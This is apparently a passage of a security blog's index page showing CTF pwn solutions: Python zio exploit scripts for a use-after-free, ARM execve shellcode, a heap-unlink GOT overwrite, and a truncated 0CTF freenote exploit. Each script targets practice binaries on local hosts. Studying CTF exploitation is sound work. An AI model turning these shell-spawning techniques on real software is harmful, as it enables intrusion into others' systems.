<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Bigtang&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description">
<meta property="og:type" content="website">
<meta property="og:title" content="Bigtang's Blog">
<meta property="og:url" content="http://bigtang.org/index.html">
<meta property="og:site_name" content="Bigtang's Blog">
<meta property="og:description">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Bigtang's Blog">
<meta name="twitter:description">
  
    <link rel="alternative" href="/atom.xml" title="Bigtang&#39;s Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link rel="stylesheet" href="/css/style.css">
</head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img lazy-src="http://bigtang.org/img/logo.jpg" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/">b1gtang</a></h1>
		</hgroup>

		

		
			<div class="switch-btn">
				<div class="icon">
					<div class="icon-ctn">
						<div class="icon-wrap icon-house" data-idx="0">
							<div class="birdhouse"></div>
							<div class="birdhouse_holes"></div>
						</div>
						<div class="icon-wrap icon-ribbon hide" data-idx="1">
							<div class="ribbon"></div>
						</div>
						
						<div class="icon-wrap icon-link hide" data-idx="2">
							<div class="loopback_l"></div>
							<div class="loopback_r"></div>
						</div>
						
						
						<div class="icon-wrap icon-me hide" data-idx="3">
							<div class="user"></div>
							<div class="shoulder"></div>
						</div>
						
					</div>
					
				</div>
				<div class="tips-box hide">
					<div class="tips-arrow"></div>
					<ul class="tips-inner">
						<li>菜单</li>
						<li>标签</li>
						
						<li>友情链接</li>
						
						
						<li>关于我</li>
						
					</ul>
				</div>
			</div>
		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">主页</a></li>
				        
							<li><a href="/archives">所有文章</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
								<a class="github" target="_blank" href="https://github.com/b1gtang/" title="github">github</a>
					        
								<a class="weibo" target="_blank" href="http://weibo.com/b1gtang" title="weibo">weibo</a>
					        
								<a class="rss" target="_blank" href="#" title="rss">rss</a>
					        
								<a class="mail" target="_blank" href="mailto://root@bigtang.org" title="mail">mail</a>
					        
						</div>
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						<a href="/tags/Arm/" style="font-size: 10px;">Arm</a> <a href="/tags/UAF/" style="font-size: 10px;">UAF</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a>
					</div>
				</section>
				
				
				
				<section class="switch-part switch-part3">
					<div id="js-friends">
					
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://l-team.org/">L</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https:leavesongs.com/">Phithon</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://le4f.net/">le4f</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://z1ng.net/">z1ng</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://x0day.me/">DM_</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://wils0n.cn/">wilson</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://th1nk.info/">Th1nk</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://sh3ll.me">Chu</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://cyrils.org">Cyrils</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.iret.xyz/">Silver</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://joychou.org/">Joychou</a>
			        
			        </div>
				</section>
				

				
				
				<section class="switch-part switch-part4">
				
					<div id="js-aboutme">Binary analysis, computer security, exploit writing, CTFs, hacking</div>
				</section>
				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide">b1gtang</h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="http://bigtang.org/img/logo.jpg" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author">b1gtang</h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">主页</a></li>
		        
					<li><a href="/archives">所有文章</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
						<a class="github" target="_blank" href="https://github.com/b1gtang/" title="github">github</a>
			        
						<a class="weibo" target="_blank" href="http://weibo.com/b1gtang" title="weibo">weibo</a>
			        
						<a class="rss" target="_blank" href="#" title="rss">rss</a>
			        
						<a class="mail" target="_blank" href="mailto://root@bigtang.org" title="mail">mail</a>
			        
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap">
  
    <article id="post-Qiangwang-Cup-2015-imdb" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/03/21/Qiangwang-Cup-2015-imdb/" class="article-date">
  	<time datetime="2016-03-21T10:22:37.000Z" itemprop="datePublished">2016-03-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/03/21/Qiangwang-Cup-2015-imdb/">Qiangwang-Cup-2015-imdb</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <blockquote>
<p>Download: <a href="http://bigtang.org/files/imdb.e31f5ffcdb6571a4e672382187bc6345">imdb.e31f5ffcdb6571a4e672382187bc6345</a><br><a href="http://bigtang.org/files/imdb.idb">imdb.idb</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">from zio import *</span><br><span class="line"></span><br><span class="line">host = &quot;192.168.33.10&quot;</span><br><span class="line">port = 2333</span><br><span class="line">io = zio((host,port),print_read=NONE,print_write=NONE)</span><br><span class="line"></span><br><span class="line"># add a TV</span><br><span class="line">def addTV(name,season,rating,introduction):</span><br><span class="line">    io.read_until(&quot;Your choice? &quot;)</span><br><span class="line">    io.writelines([&quot;1&quot;,name,season,rating,introduction])</span><br><span class="line"></span><br><span class="line"># add a Movie</span><br><span class="line">def addMovie(name,actors,rating,introduction):</span><br><span class="line">    io.read_until(&quot;Your choice? &quot;)</span><br><span class="line">    io.writelines([&quot;2&quot;,name,actors,rating,introduction])</span><br><span class="line"></span><br><span class="line"># remove an entry</span><br><span class="line">def removeEntry(name):</span><br><span class="line">    io.read_until(&quot;Your choice? &quot;)</span><br><span class="line">    io.writelines([&quot;3&quot;,name])</span><br><span class="line"></span><br><span class="line"># show all TV/Movie</span><br><span class="line">def showAll():</span><br><span class="line">    #raw_input(&quot;DEBUG:&quot;)</span><br><span class="line">    io.read_until(&quot;Your choice? &quot;)</span><br><span class="line">    io.writeline(&quot;4&quot;)</span><br><span class="line"></span><br><span class="line"># read any address</span><br><span class="line">def readAddr(address):</span><br><span class="line">    addTV(&quot;a&quot;*0x10,&quot;0&quot;,&quot;100&quot;,&quot;f&quot;*0x7f)</span><br><span class="line">    addTV(&quot;b&quot;*0x10,&quot;0&quot;,&quot;100&quot;,&quot;f&quot;*0x7f)</span><br><span class="line">    addTV(&quot;b&quot;*0x10,&quot;0&quot;,&quot;100&quot;,&quot;f&quot;*0x7f)</span><br><span class="line">    removeEntry(&quot;a&quot;*0x10)</span><br><span class="line">    removeEntry(&quot;b&quot;*0x10)</span><br><span class="line">    fakeMovie  = &quot;&quot;</span><br><span class="line">    fakeMovie += l64(0x4015b0)</span><br><span class="line">    fakeMovie += (&quot;b&quot;*16).ljust(64,&apos;\x00&apos;)</span><br><span class="line">    fakeMovie += (&quot;f&quot;*0x80)</span><br><span class="line">    fakeMovie += l64(0x42c80000)</span><br><span class="line">    fakeMovie += l64(address)</span><br><span class="line">    assert len(fakeMovie) == 0xd8</span><br><span class="line">    addMovie(&quot;a&quot;*0x10,fakeMovie,&quot;100&quot;,&quot;f&quot;*0x7f)</span><br><span class="line">    showAll()</span><br><span class="line">    io.read_until(&quot;actors: &quot;)</span><br><span class="line">    io.read_until(&quot;actors: &quot;)</span><br><span class="line">    leak = l64(io.readline().strip().ljust(8,&apos;\x00&apos;))</span><br><span class="line">    #print &quot;[*] Got [0x%x] 0x%x &quot; % (address,leak)</span><br><span class="line">    removeEntry(&quot;a&quot;*0x10)</span><br><span class="line">    removeEntry(&quot;b&quot;*0x10)</span><br><span class="line">    return leak</span><br><span class="line"></span><br><span class="line"># call any address</span><br><span class="line">def callAddr(vtable,address):</span><br><span class="line">    addTV(&quot;a&quot;*0x10,&quot;0&quot;,&quot;100&quot;,&quot;f&quot;*0x7f)</span><br><span class="line">    addTV(&quot;b&quot;*0x10,&quot;0&quot;,&quot;100&quot;,&quot;f&quot;*0x7f)</span><br><span class="line">    addTV(&quot;b&quot;*0x10,&quot;0&quot;,&quot;100&quot;,&quot;f&quot;*0x7f)</span><br><span class="line">    removeEntry(&quot;a&quot;*0x10)</span><br><span class="line">    removeEntry(&quot;b&quot;*0x10)</span><br><span class="line">    fakeMovie  = &quot;&quot;</span><br><span class="line">    fakeMovie += l64(vtable)</span><br><span class="line">    fakeMovie += (&quot;b&quot;*16).ljust(64,&apos;\x00&apos;)</span><br><span class="line">    fakeMovie += (&quot;f&quot;*0x80)</span><br><span class="line">    fakeMovie += l64(0x42c80000)</span><br><span class="line">    fakeMovie += l64(address)</span><br><span class="line">    assert len(fakeMovie) == 0xd8</span><br><span class="line">    addMovie(&quot;a&quot;*0x10,fakeMovie,&quot;100&quot;,&quot;f&quot;*0x7f)</span><br><span class="line">    showAll()</span><br><span class="line"></span><br><span class="line">heap = readAddr(0x601dc0) - 0x10</span><br><span class="line">vtable = heap + 0x1c0</span><br><span class="line">print &quot;[*] Got heap 0x%x&quot; % heap</span><br><span class="line"></span><br><span class="line">puts = readAddr(0x601c40)</span><br><span class="line">libc = puts - 0x6fe30</span><br><span class="line">print &quot;[*] Got libc_base 0x%x &quot; % (libc)</span><br><span class="line">print &quot;[*] Got spawn_Shell 0x%x&quot; % (libc + 0x46520)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">callAddr(vtable,libc + 0x46520)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/UAF/">UAF</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
    <article id="post-RCTF-2015-Quals-pwn500" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/03/21/RCTF-2015-Quals-pwn500/" class="article-date">
  	<time datetime="2016-03-21T10:13:45.000Z" itemprop="datePublished">2016-03-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/03/21/RCTF-2015-Quals-pwn500/">RCTF-2015-Quals-pwn500</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <blockquote>
<p>Download: <a href="http://bigtang.org/files/g27_9f47c9e9d3e7605f3bbdd4f92e51250d">g27_9f47c9e9d3e7605f3bbdd4f92e51250d</a><br><a href="http://bigtang.org/files/g27_9f47c9e9d3e7605f3bbdd4f92e51250d.idb">g27_9f47c9e9d3e7605f3bbdd4f92e51250d.idb</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">from zio import *</span><br><span class="line"></span><br><span class="line"># create socket</span><br><span class="line">host = &quot;127.0.0.1&quot;</span><br><span class="line">port = 2333</span><br><span class="line">io = zio((host,port))</span><br><span class="line"></span><br><span class="line"># check ID</span><br><span class="line">check_id = &apos;1&apos; * 17 + &apos;0&apos;</span><br><span class="line">io.read_until(&quot;Input your ID to check in:\n&quot;)</span><br><span class="line">io.writeline(check_id)</span><br><span class="line"></span><br><span class="line"># enable cantin</span><br><span class="line">io.read_until(&quot;choose:\n&quot;)</span><br><span class="line">io.writeline(&apos;1&apos;)</span><br><span class="line">io.read_until(&quot;3.CanTin\n&quot;)</span><br><span class="line">io.writeline(&apos;1&apos;)</span><br><span class="line">io.read_until(&quot;Which carriage?\n&quot;)</span><br><span class="line">io.writeline(&apos;5&apos;)</span><br><span class="line"></span><br><span class="line"># read access code</span><br><span class="line">io.read_until(&quot;choose:\n&quot;)</span><br><span class="line">io.writeline(&apos;1&apos;)</span><br><span class="line">io.writeline(&apos;1&apos;)</span><br><span class="line">io.writeline(&apos;0&apos;)</span><br><span class="line">io.writeline(&quot;Bigtang&quot;)</span><br><span class="line"></span><br><span class="line"># leak access code</span><br><span class="line">io.read_until(&quot;choose:\n&quot;)</span><br><span class="line">io.writeline(&apos;1&apos;)</span><br><span class="line">io.writeline(&apos;3&apos;)</span><br><span class="line">io.read_until(&quot;want?\n&quot;)</span><br><span class="line">hungry = -235</span><br><span class="line">io.writeline(str(hungry))</span><br><span class="line">io.read_until(&quot;choose:\n&quot;)</span><br><span class="line">io.writeline(&quot;4&quot;)</span><br><span class="line"></span><br><span class="line"># open access code</span><br><span class="line">io.read_until(&quot;choose:\n&quot;)</span><br><span class="line">io.writeline(&apos;1&apos;)</span><br><span class="line">io.read_until(&quot;3.CanTin\n&quot;)</span><br><span class="line">io.writeline(&apos;1&apos;)</span><br><span class="line">io.read_until(&quot;Which carriage?\n&quot;)</span><br><span class="line">io.writeline(&apos;0&apos;)</span><br><span class="line">io.read_until(&quot;Access code:&quot;)</span><br><span class="line">io.writeline(&apos;\x58&apos;*0x32)</span><br><span class="line"></span><br><span class="line"># shellcode = &quot;&quot;</span><br><span class="line"># shellcode += &quot;\x01\x60\x8f\xe2&quot; # add r6, pc, #1</span><br><span class="line"># shellcode += &quot;\x16\xff\x2f\xe1&quot; # add bx r6</span><br><span class="line"># shellcode += &quot;\x40\x40&quot; # eors r0, r0</span><br><span class="line"># shellcode += &quot;\x78\x44&quot; # add r0, pc</span><br><span class="line"># shellcode += &quot;\x0c\x30&quot; # adds r0, #12</span><br><span class="line"># shellcode += &quot;\x49\x40&quot; # eors r1, r1</span><br><span class="line"># shellcode += &quot;\x52\x40&quot; # eors r2, r2</span><br><span class="line"># shellcode += &quot;\x0b\x27&quot; # movs r7, #11</span><br><span class="line"># shellcode += &quot;\x01\xdf&quot; # svc 1</span><br><span class="line"># shellcode += &quot;\x01\x27&quot; # movs r7, #1</span><br><span class="line"># shellcode += &quot;\x01\xdf&quot; # svc 1</span><br><span class="line"># shellcode += &quot;\x2f\x2f&quot; # .short 0x2f2f</span><br><span class="line"># shellcode += &quot;\x62\x69\x6e\x2f&quot; # .word 0x2f6e6962</span><br><span class="line"># shellcode += &quot;\x2f\x73&quot; # .short 0x732f</span><br><span class="line"># shellcode += &quot;\x68&quot; # .byte 0x68</span><br><span class="line"></span><br><span class="line">shellcode  = &quot;&quot;</span><br><span class="line">shellcode += &quot;\x01\x30\x8f\xe2&quot;</span><br><span class="line">shellcode += &quot;\x13\xff\x2f\xe1&quot;</span><br><span class="line">shellcode += &quot;\x78\x46\x08\x30&quot;</span><br><span class="line">shellcode += &quot;\x49\x1a\x92\x1a&quot;</span><br><span class="line">shellcode += &quot;\x0b\x27\x01\xdf&quot;</span><br><span class="line">shellcode += &quot;\x2f\x62\x69\x6e&quot;</span><br><span class="line">shellcode += &quot;\x2f\x73\x68&quot;</span><br><span class="line"></span><br><span class="line">io.writeline(&apos;1&apos;)</span><br><span class="line">io.writeline(shellcode)</span><br><span class="line">#raw_input(&quot;Debug&quot;)</span><br><span class="line">#io.writeline(&quot;whoami&quot;)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Arm/">Arm</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
    <article id="post-Practice-2016-heap-unlink" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/02/26/Practice-2016-heap-unlink/" class="article-date">
  	<time datetime="2016-02-26T10:13:14.000Z" itemprop="datePublished">2016-02-26</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/02/26/Practice-2016-heap-unlink/">Practice-2016-heap-unlink</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <blockquote>
<p>Download: <a href="http://bigtang.org/files/heap">heap</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">from zio import *</span><br><span class="line"></span><br><span class="line">#io = zio(&apos;./heap&apos;)</span><br><span class="line">io  = zio((&apos;127.1&apos;,6666))</span><br><span class="line"></span><br><span class="line">def Add_chunk(length):</span><br><span class="line">	io.writeline(&apos;1&apos;)</span><br><span class="line">	io.read_until(&apos;Input the size of chunk you want to add:&apos;)</span><br><span class="line">	io.writeline(str(length))</span><br><span class="line"></span><br><span class="line">def Set_chunk(index,data):</span><br><span class="line">	io.writeline(&apos;2&apos;)</span><br><span class="line">	io.read_until(&apos;Set chunk index:&apos;)</span><br><span class="line">	io.writeline(str(index))</span><br><span class="line">	io.read_until(&apos;Set chunk data:&apos;)</span><br><span class="line">	io.write(data)</span><br><span class="line"></span><br><span class="line">def Delete_chunk(index):</span><br><span class="line">	io.writeline(&apos;3&apos;)</span><br><span class="line">	io.read_until(&apos;Delete chunk index:&apos;)</span><br><span class="line">	io.writeline(str(index))</span><br><span class="line"></span><br><span class="line">def Print_chunk(index):</span><br><span class="line">	io.writeline(&apos;4&apos;)</span><br><span class="line">	io.read_until(&apos;Print chunk index:&apos;)</span><br><span class="line">	io.writeline(str(index))</span><br><span class="line"></span><br><span class="line">Add_chunk(0x80)</span><br><span class="line">Add_chunk(0x80)</span><br><span class="line">Add_chunk(0x80)</span><br><span class="line"></span><br><span class="line">ptr = 0x8049d60</span><br><span class="line">fd  = ptr - 0xc</span><br><span class="line">bk  = ptr - 0x8</span><br><span class="line">payload  = &apos;&apos;</span><br><span class="line">payload += l32(0) + l32(0x89) + l32(fd) + l32(bk) + &apos;A&apos;*(0x80-4*4)</span><br><span class="line">payload += l32(0x80) + l32(0x88)</span><br><span class="line">Set_chunk(0, payload)</span><br><span class="line">Set_chunk(2, &apos;/bin/sh&apos;.ljust(0x80,&apos;\0&apos;))</span><br><span class="line">Delete_chunk(1)</span><br><span class="line"></span><br><span class="line">free_got = 0x8049ce8</span><br><span class="line">payload  = l32(0)*3 + l32(free_got)</span><br><span class="line">Set_chunk(0, payload)</span><br><span class="line"></span><br><span class="line">Print_chunk(0)</span><br><span class="line">system = l32(io.read(4)) - 0xf75afc60 + 0xf7579190</span><br><span class="line">Set_chunk(0, l32(system))</span><br><span class="line"></span><br><span class="line">Delete_chunk(2)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
    <article id="post-0CTF-2015-Quals-freenote-x64" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2015/12/12/0CTF-2015-Quals-freenote-x64/" class="article-date">
  	<time datetime="2015-12-11T17:43:59.000Z" itemprop="datePublished">2015-12-12</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/12/12/0CTF-2015-Quals-freenote-x64/">0CTF-2015-Quals-freenote-x64</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <blockquote>
<p>Download: <a href="http://bigtang.org/files/freenote_x64">freenote_x64</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">from zio import *</span><br><span class="line"></span><br><span class="line">host = &apos;127.0.0.1&apos;</span><br><span class="line">port = 10001</span><br><span class="line">#target = (host,port)</span><br><span class="line">target = &apos;./freenote_x64&apos;</span><br><span class="line"></span><br><span class="line">io = zio(target,timeout=2333,print_read=COLORED(REPR,&quot;yellow&quot;),print_write=COLORED(REPR,&quot;red&quot;))</span><br><span class="line"></span><br><span class="line">def List_Note():</span><br><span class="line">    io.read_until(&apos;Your choice: &apos;)</span><br><span class="line">    io.writeline(&apos;1&apos;)</span><br><span class="line"></span><br><span class="line">def New_Note(note):</span><br><span class="line">    io.read_until(&apos;Your choice: &apos;)</span><br><span class="line">    io.writeline(&apos;2&apos;)</span><br><span class="line">    io.read_until(&apos;Length of new note: &apos;)</span><br><span class="line">    io.writeline(str(len(note)))</span><br><span class="line">    io.read_until(&apos;Enter your note: &apos;)</span><br><span class="line">    io.write(note)</span><br><span class="line"></span><br><span class="line">def Edit_Note(num,note):</span><br><span class="line">    io.read_until(&apos;Your choice: &apos;)</span><br><span class="line">    io.writeline(&apos;3&apos;)</span><br><span class="line">    io.read_until(&apos;Note number: &apos;)</span><br><span class="line">    io.writeline(str(num))</span><br><span class="line">    io.read_until(&apos;Length of note: &apos;)</span><br><span class="line">    io.writeline(str(len(note)))</span><br><span class="line">    io.read_until(&apos;Enter your note: &apos;)</span><br><span class="line">    io.writeline(note)</span><br><span class="line"></span><br><span class="line">def Delete_Note(num):</span><br><span class="line">    io.read_until(&apos;Your choice: &apos;)</span><br><span class="line">    io.writeline(&apos;4&apos;)</span><br><span class="line">    io.read_until(&apos;Note number: &apos;)</span><br><span class="line">    io.writeline(str(num))</span><br><span class="line"></span><br><span class="line">def Exit():</span><br><span class="line">    io.read_until(&apos;Your choice: &apos;)</span><br><span class="line">    io.writeline(&apos;5&apos;)</span><br><span class="line"></span><br><span class="line">io.gdb_hint([0x400b14])</span><br><span class="line"></span><br><span class="line"># leak libc</span><br><span class="line">New_Note(&apos;a&apos;*0x10)</span><br><span class="line">New_Note(&apos;b&apos;*0x10)</span><br><span class="line">New_Note(&apos;c&apos;*0x10)</span><br><span class="line">New_Note(&apos;d&apos;*0x10)</span><br><span class="line">Delete_Note(0)</span><br><span class="line">Delete_Note(2)</span><br><span class="line">New_Note(&apos;e&apos;*0x8)</span><br><span class="line">New_Note(&apos;f&apos;*0x8)</span><br><span class="line">List_Note()</span><br><span 